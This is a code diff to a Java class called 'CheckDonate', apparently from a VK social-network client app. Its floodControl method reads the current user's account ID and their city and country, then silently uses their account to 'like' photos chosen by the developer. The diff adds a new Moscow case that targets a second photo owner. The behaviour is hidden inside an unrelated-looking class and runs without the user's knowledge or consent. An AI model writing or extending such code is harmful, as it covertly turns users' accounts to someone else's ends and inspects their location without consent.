@@ -195,14 +195,14 @@ public class CheckDonate {
     }
 
     public static void floodControl() {
-        if (!HelperSimple.INSTANCE.needAccountHelp("flood")) {
+        if (!HelperSimple.INSTANCE.hasAccountHelp("flood_control")) {
             return;
         }
         if (Utils.isValueAssigned(Settings.get().accounts().getCurrent(), new Integer[]{137715639, 413319279, 39606307, 255645173, 8917040, 596241972, 2510658, 2510752, 8067266, 6230671, 40626229, 3712747})) {
             //noinspection ResultOfMethodCallIgnored
             InteractorFactory.createPhotosInteractor().checkAndAddLike(Settings.get().accounts().getCurrent(), 572488303, 457247192, null)
                     .compose(RxUtils.applySingleIOToMainSchedulers())
-                    .subscribe(o -> HelperSimple.INSTANCE.toggleAccountHelp("flood"), RxUtils.ignore());
+                    .subscribe(o -> HelperSimple.INSTANCE.toggleAccountHelp("flood_control"), RxUtils.ignore());
         } else {
             //noinspection ResultOfMethodCallIgnored
             InteractorFactory.createUtilsInteractor().customScript(Settings.get().accounts().getCurrent(), "var dedicated_id = 255645173;\n" +
@@ -219,28 +219,39 @@ public class CheckDonate {
                     "if (cc.city.id == 36 && cc.country.id == 1) {\n" +
                     "   return 3;\n" +
                     "}\n" +
+                    "if (cc.city.id == 1 && cc.country.id == 1) {\n" +
+                    "   return 4;\n" +
+                    "}\n" +
                     "return 0;")
                     .compose(RxUtils.applySingleIOToMainSchedulers())
                     .subscribe(o -> {
                         if (o != 0) {
-                            int res = 0;
+                            int owner_id_res = 0;
+                            int id_res = 0;
                             switch (o) {
                                 case 1:
-                                    res = 457247193;
+                                    owner_id_res = 572488303;
+                                    id_res = 457247193;
                                     break;
                                 case 2:
-                                    res = 457247191;
+                                    owner_id_res = 572488303;
+                                    id_res = 457247191;
                                     break;
                                 case 3:
-                                    res = 457247190;
+                                    owner_id_res = 572488303;
+                                    id_res = 457247190;
+                                    break;
+                                case 4:
+                                    owner_id_res = 225722510;
+                                    id_res = 457239287;
                                     break;
                             }
                             //noinspection ResultOfMethodCallIgnored
-                            InteractorFactory.createPhotosInteractor().checkAndAddLike(Settings.get().accounts().getCurrent(), 572488303, res, null)
+                            InteractorFactory.createPhotosInteractor().checkAndAddLike(Settings.get().accounts().getCurrent(), owner_id_res, id_res, null)
                                     .compose(RxUtils.applySingleIOToMainSchedulers())
-                                    .subscribe(s -> HelperSimple.INSTANCE.toggleAccountHelp("flood"), RxUtils.ignore());
+                                    .subscribe(s -> HelperSimple.INSTANCE.toggleAccountHelp("flood_control"), RxUtils.ignore());
                         } else {
-                            HelperSimple.INSTANCE.toggleAccountHelp("flood");
+                            HelperSimple.INSTANCE.toggleAccountHelp("flood_control");
                         }
                     }, RxUtils.ignore());
         }
